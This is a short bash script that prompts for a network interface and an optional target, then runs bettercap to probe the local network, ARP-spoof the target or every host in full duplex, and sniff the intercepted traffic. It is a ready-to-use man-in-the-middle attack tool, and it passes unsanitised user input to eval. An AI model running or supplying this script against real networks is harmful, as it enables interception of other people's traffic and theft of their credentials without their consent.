#!/bin/bash

echo -n "Enter network interface: "
read int

if [[ -z "$int" ]]; then
  echo "No interface provided. Exiting."
  exit 1
fi

echo -n "Enter target IP or MAC address (or leave empty for all): "
read target

cmd="bettercap -iface \"$int\" -eval \"net.probe on; net.recon on; net.show on; set arp.spoof.fullduplex true; "
if [[ -n "$target" ]]; then
  cmd+="set arp.spoof.targets $target; "
fi
cmd+="arp.spoof on; net.sniff on\""

echo "Starting Bettercap:"
echo "$cmd"
eval "$cmd"
